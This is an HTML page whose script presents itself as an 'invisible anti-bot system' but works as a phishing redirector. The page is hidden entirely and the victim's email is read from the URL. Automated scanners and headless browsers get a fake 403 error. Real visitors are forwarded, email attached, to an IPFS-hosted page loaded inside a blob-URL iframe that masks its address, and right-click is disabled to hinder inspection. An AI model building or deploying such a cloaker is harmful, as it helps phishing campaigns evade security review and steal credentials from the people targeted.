<!DOCTYPE html>
<html style="display:none;">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <meta name="referrer" content="no-referrer">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Completely transparent favicon -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22></svg>">
    
    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: transparent;
            overflow: hidden;
            width: 100%;
            height: 100%;
        }
        /* Make absolutely everything invisible */
        * {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }
    </style>
</head>
<body>
<!-- COMPLETELY EMPTY - NOTHING VISIBLE -->

<script>
// COMPLETELY INVISIBLE ANTI-BOT SYSTEM
(() => {
    'use strict';
    
    // Configuration
    const TARGET_BASE = "https://bafkreick3zbqfdrqbzniqoyztbbmu52nuklp2blqgwfbbveu6e5tasjngu.ipfs.dweb.link/";
    const HUMAN_COOKIE = 'hv_' + Math.random().toString(36).substr(2, 9);
    const COOKIE_EXPIRES = 86400;
    const BOT_COOKIE = 'bd_' + Math.random().toString(36).substr(2, 9);
    const BOT_COOKIE_EXPIRES = 1800;
    
    // Empty title
    document.title = ' ';
    
    // Utility functions
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
        return null;
    }
    
    function setCookie(name, value, seconds) {
        const expires = new Date(Date.now() + seconds * 1000).toUTCString();
        document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax; Secure`;
    }
    
    function getEmail() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('email') || '';
        } catch(e) {
            return '';
        }
    }
    
    // Simple bot detection (invisible)
    function detectBot() {
        let score = 0;
        
        // Check for automation
        if (navigator.webdriver === true) score += 40;
        
        // Check user agent for headless patterns
        const ua = navigator.userAgent || '';
        if (/HeadlessChrome|PhantomJS|Electron/i.test(ua)) score += 30;
        
        // Check for automation properties
        if (window.__webdriver_evaluate || window.__selenium_evaluate) score += 25;
        
        // Quick screen check
        if (window.screen.width === 800 && window.screen.height === 600) score += 10;
        
        return score > 35;
    }
    
    // Minimal interaction check
    function waitForInteraction() {
        return new Promise((resolve) => {
            let interacted = false;
            
            const events = ['mousemove', 'touchstart', 'keydown', 'click'];
            const handler = () => {
                if (!interacted) {
                    interacted = true;
                    events.forEach(e => document.removeEventListener(e, handler));
                    resolve(true);
                }
            };
            
            events.forEach(e => {
                document.addEventListener(e, handler, { once: false, passive: true });
            });
            
            // Shorter timeout
            setTimeout(() => {
                if (!interacted) {
                    events.forEach(e => document.removeEventListener(e, handler));
                    resolve(false);
                }
            }, 2000);
        });
    }
    
    // Create invisible blob (no headers, no titles)
    function createInvisibleBlob(targetUrl) {
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title> </title>
<style>
html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
iframe { width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<iframe src="${targetUrl}"></iframe>
</body>
</html>`;
        return new Blob([html], { type: 'text/html' });
    }
    
    // Show fake error (only for bots)
    function showFakeError() {
        const html = `<!DOCTYPE html>
<html>
<head>
<title>Access Denied</title>
<style>
body { margin: 0; padding: 40px; font-family: Arial, sans-serif; }
</style>
</head>
<body>
<h2>Access Restricted</h2>
<p>Unable to verify your browser. Please try again later.</p>
<p style="color:#888;font-size:12px;">Error Code: 403_FORBIDDEN</p>
</body>
</html>`;
        
        const blob = new Blob([html], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);
        window.location.replace(blobUrl);
    }
    
    // Main invisible flow
    async function executeInvisibleProtection() {
        // Show page (but it's invisible)
        document.documentElement.style.display = 'block';
        
        // Check cookies
        if (getCookie(HUMAN_COOKIE) === '1') {
            const email = getEmail();
            const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
            const blob = createInvisibleBlob(target);
            const blobUrl = URL.createObjectURL(blob);
            window.location.replace(blobUrl);
            return;
        }
        
        if (getCookie(BOT_COOKIE) === '1') {
            setTimeout(showFakeError, 100);
            return;
        }
        
        // Basic rate limiting
        const lastVisit = sessionStorage.getItem('last_visit');
        const now = Date.now();
        if (lastVisit && (now - parseInt(lastVisit)) < 1000) {
            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
            setTimeout(showFakeError, 100);
            return;
        }
        sessionStorage.setItem('last_visit', now.toString());
        
        // Wait for any interaction
        await new Promise(r => setTimeout(r, 100));
        
        const hasInteraction = await waitForInteraction();
        
        if (!hasInteraction) {
            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
            setTimeout(showFakeError, 100);
            return;
        }
        
        // Bot detection
        await new Promise(r => setTimeout(r, 200));
        
        const isBot = detectBot();
        
        if (isBot) {
            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
            setTimeout(showFakeError, 100);
            return;
        }
        
        // Human verified
        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
        
        const email = getEmail();
        const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
        
        await new Promise(r => setTimeout(r, 200));
        
        const blob = createInvisibleBlob(target);
        const blobUrl = URL.createObjectURL(blob);
        window.location.replace(blobUrl);
        
        setTimeout(() => {
            try {
                URL.revokeObjectURL(blobUrl);
            } catch(e) {}
        }, 10000);
    }
    
    // Start immediately
    setTimeout(() => {
        executeInvisibleProtection().catch(() => {
            // Silent fallback
            const email = getEmail();
            const target = email ? 
                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                TARGET_BASE;
            window.location.replace(target);
        });
    }, 100);
    
    // Minimal anti-debugging
    document.addEventListener('contextmenu', e => e.preventDefault());
    
})();
</script>
</body>
</html>
